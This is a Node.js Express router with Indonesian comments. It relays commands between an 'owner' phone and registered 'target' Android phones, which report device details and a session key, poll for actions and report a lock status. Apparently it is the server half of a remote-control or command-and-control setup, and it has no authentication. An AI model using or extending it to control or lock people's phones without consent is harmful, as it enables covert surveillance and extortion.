// ═══════════════════════════════════════════════
//  CONTROL ROUTES — untuk fitur remote control
//  Tidak perlu Firebase, pakai server sendiri
// ═══════════════════════════════════════════════
const express = require('express');
const router  = express.Router();

// In-memory store untuk devices & commands
// (replace dengan file JSON untuk persistence)
const devices  = {};  // { deviceId: { ...info } }
const commands = {};  // { deviceId: { action, timestamp } }
const results  = {};  // { deviceId: { field: value } }

// ── AGENT endpoints (dipanggil HP target) ──────

// POST /api/control/register — HP target daftar diri
router.post('/register', (req, res) => {
  const { device_id, device_target, brand, model, android_ver,
          battery_level, device_ip, network_type, session_key } = req.body;

  if (!device_id) return res.json({ success: false, message: 'device_id required' });

  devices[device_id] = {
    device_id,
    device_target: device_target || `${brand} ${model}`,
    device_model:  model || '',
    device_brand:  brand || '',
    android_ver:   android_ver || '',
    battery_level: battery_level || '?',
    device_ip:     device_ip || '0.0.0.0',
    network_type:  network_type || 'Unknown',
    last_seen:     Date.now(),
    status:        'online',
    lock_status:   results[device_id]?.lock_status || 'unlocked',
    session_key:   session_key || '',
  };

  // Ambil perintah yang menunggu (kalau ada)
  const cmd = commands[device_id] || null;

  res.json({ success: true, command: cmd });
});

// POST /api/control/heartbeat — HP target update status
router.post('/heartbeat', (req, res) => {
  const { device_id, battery_level } = req.body;
  if (!device_id || !devices[device_id]) {
    return res.json({ success: false, command: null });
  }

  devices[device_id].last_seen     = Date.now();
  devices[device_id].status        = 'online';
  devices[device_id].battery_level = battery_level || devices[device_id].battery_level;

  // Kirim perintah kalau ada
  const cmd = commands[device_id] || null;
  if (cmd) delete commands[device_id]; // hapus setelah dikirim

  res.json({ success: true, command: cmd });
});

// POST /api/control/result — HP target kirim hasil eksekusi
router.post('/result', (req, res) => {
  const { device_id, field, value } = req.body;
  if (!device_id) return res.json({ success: false });

  if (!results[device_id]) results[device_id] = {};
  results[device_id][field]  = value;
  results[device_id].updated = Date.now();

  // Update lock status di devices juga
  if (field === 'lock_status' && devices[device_id]) {
    devices[device_id].lock_status = value;
  }

  res.json({ success: true });
});

// ── CONTROLLER endpoints (dipanggil HP owner) ──

// GET /api/control/devices — list semua target
router.get('/devices', (req, res) => {
  const now  = Date.now();
  const list = Object.values(devices).map(d => ({
    ...d,
    is_online: (now - d.last_seen) < 20000,
  }));
  res.json({ success: true, devices: list });
});

// POST /api/control/send — kirim perintah ke target
router.post('/send', (req, res) => {
  const { device_id, action } = req.body;
  if (!device_id || !action) {
    return res.json({ success: false, message: 'device_id & action required' });
  }
  if (!devices[device_id]) {
    return res.json({ success: false, message: 'Device tidak ditemukan' });
  }

  commands[device_id] = {
    action,
    timestamp: Date.now(),
  };

  res.json({ success: true, message: `Perintah "${action}" dikirim ke ${device_id}` });
});

// GET /api/control/result/:deviceId/:field — ambil hasil eksekusi
router.get('/result/:deviceId/:field', (req, res) => {
  const { deviceId, field } = req.params;
  const data = results[deviceId]?.[field] || null;
  res.json({ success: true, value: data, updated: results[deviceId]?.updated || 0 });
});

// GET /api/control/result/:deviceId — semua hasil dari device
router.get('/result/:deviceId', (req, res) => {
  const data = results[req.params.deviceId] || {};
  res.json({ success: true, data });
});

module.exports = router;
